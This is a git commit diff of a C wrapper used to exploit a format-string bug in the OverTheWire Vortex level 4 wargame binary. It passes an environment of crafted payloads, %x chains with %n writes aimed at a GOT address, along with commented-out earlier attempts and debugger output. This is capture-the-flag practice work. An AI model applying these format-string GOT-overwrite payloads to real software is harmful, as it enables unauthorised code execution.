6e6332ba174c8f98d84154352d9aafd5139557b7
bmoar <ben@rooted.systems>
2016-01-13 00:56:55 -0500

    we got a GOT overwriteg st!

--- otw/vortex/4/exec_wrapper.c
+++ otw/vortex/4/exec_wrapper.c
@@ -2,12 +2,19 @@
 
 char *newargs[] = { NULL };
 char *newenv[] = { 
-    "AAAA \%x", 
-    "AAAB \%x", 
-    "AAAAAAAAAAAAAAAA%.010u%1$x%.010u%1$x%.010u%1$x%.010u%1$x",
-    "AAAD \%x"
+    "CCCC", 
+    "\x14\xa0\x04\x08", 
+    //"AAAAAAAAAAAAAAAA%.010u%1$x%.010u%1$x%.010u%1$x%.010u%1$x",
+    //"AAAA%.010u",
+//AAAA4160737280|804847b[Inferior 1 (process 235624) exited with code 01]
+    // need to overwrite *0x804a014 with env[3]
+    //"AAAA%10$x.%n\x14\xa0\x04\x08",
+    //"\x14\xa0\x04\x08%48$x|%n|",
+    //"%08x.%08x.%08x.%08x.%08x.%08x %s \n",
+    "AAAaA%.010u%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n%1uAAA\x14\xa0\x04\x08.\x14\xa0\x04\x08%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n\n",
+    "\x14\xa0\x04\x08", 
 };
 
-int main() {
-    execvpe("/vortex/vortex4", newargs, newenv);
+int main(int argc, char *argv[]) {
+    execvpe("/home/bmoar/git/hacking/otw/vortex/4/vortex4", newargs, newenv);
 }
